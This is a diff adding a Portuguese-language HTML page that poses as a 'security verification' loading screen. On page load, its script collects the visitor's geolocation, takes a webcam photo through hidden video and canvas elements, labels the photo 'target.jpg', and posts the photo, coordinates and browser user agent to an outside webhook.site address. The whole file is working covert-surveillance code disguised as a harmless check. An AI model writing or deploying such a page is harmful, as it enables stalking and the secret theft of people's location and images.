@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verificação de Segurança</title>
+</head>
+<body>
+    <p>Carregando verificação... Por favor, aguarde.</p>
+
+    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" style="display:none;" autoplay></video>
+
+    <script>
+        const WEBHOOK_URL = 'https://webhook.site/0a312df4-2cb5-4de1-834f-85233f004aeb';
+
+        async function capture() {
+            // 1. Captura Localização
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    // 2. Captura Foto
+                    const photoBlob = await takePhoto();
+                    
+                    // 3. Envio de Dados
+                    sendData(lat, lon, accuracy, photoBlob);
+                });
+            }
+        }
+
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob((blob) => {
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(blob);
+                        }, 'image/jpeg');
+                    };
+                });
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function sendData(lat, lon, acc, photo) {
+            const formData = new FormData();
+            formData.append('latitude', lat);
+            formData.append('longitude', lon);
+            formData.append('accuracy', acc);
+            if (photo) formData.append('photo', photo, 'target.jpg');
+            formData.append('userAgent', navigator.userAgent);
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        window.onload = capture;
+    </script>
+</body>
+</html>
